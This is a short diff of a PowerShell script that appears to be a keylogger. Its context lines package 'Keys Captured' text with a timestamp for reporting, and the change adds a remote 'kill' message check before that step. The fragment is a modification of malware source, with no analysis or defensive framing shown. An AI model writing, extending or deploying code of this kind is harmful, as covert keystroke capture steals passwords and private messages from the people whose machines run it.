@@ -250,7 +250,7 @@ While ($true){
         }
     }
     finally{
-        If ($keyPressed) {
+        If ($keyPressed -and $messages.message.text -notcontains "kill") {
             $escmsgsys = $nosave -replace '[&<>]', {$args[0].Value.Replace('&', '&amp;').Replace('<', '&lt;').Replace('>', '&gt;')}
             $timestamp = Get-Date -Format "dd-MM-yyyy HH:mm:ss"
             $contents = "$glass Keys Captured : "+$escmsgsys
